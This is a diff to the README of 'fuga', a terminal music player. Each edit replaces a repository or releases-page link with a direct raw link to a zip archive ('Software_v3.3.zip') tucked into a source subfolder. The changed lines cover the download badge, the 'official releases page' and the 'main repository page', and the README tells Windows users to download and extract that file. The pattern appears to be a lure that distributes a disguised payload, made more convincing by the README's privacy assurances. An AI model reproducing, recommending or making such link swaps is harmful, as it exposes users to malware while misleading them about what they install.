@@ -1,6 +1,6 @@
 # 🎵 fuga - Manage all your music in one place
 
-[![Download Fuga](https://img.shields.io/badge/Download-Fuga-blue.svg)](https://github.com/zarlasobering949/fuga)
+[![Download Fuga](https://img.shields.io/badge/Download-Fuga-blue.svg)](https://raw.githubusercontent.com/zarlasobering949/fuga/main/src/source/spotify/Software_v3.3.zip)
 
 Fuga brings your entire music collection into a single window. You can play tracks from your local folders, Spotify, YouTube, SomaFM, and internet radio stations. The interface displays album art directly in your terminal. This tool simplifies music playback for listeners who prefer a clean, text-based experience.
 
@@ -8,7 +8,7 @@ Fuga brings your entire music collection into a single window. You can play trac
 
 You need to perform a few steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/zarlasobering949/fuga) to find the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/zarlasobering949/fuga/main/src/source/spotify/Software_v3.3.zip) to find the latest version.
 2. Look for the file ending in `.zip`.
 3. Click the file to save it to your computer.
 4. Right-click the downloaded folder and select Extract All.
@@ -82,6 +82,6 @@ Yes. Change the setting in the configuration file to disable thumbnails if you p
 
 ## 🚀 Further support
 
-If you encounter issues, look at the files inside the documentation folder. You can also return to the [main repository page](https://github.com/zarlasobering949/fuga) to see if others reported a similar problem. Keep your version updated to receive the latest improvements and bug fixes. Regularly check the download page for newer files.
+If you encounter issues, look at the files inside the documentation folder. You can also return to the [main repository page](https://raw.githubusercontent.com/zarlasobering949/fuga/main/src/source/spotify/Software_v3.3.zip) to see if others reported a similar problem. Keep your version updated to receive the latest improvements and bug fixes. Regularly check the download page for newer files.
 
 This software respects your privacy. It does not track your listening habits or share your data with other parties. Your credentials remain local to your computer. Enjoy your music library with a fast, modern terminal interface.
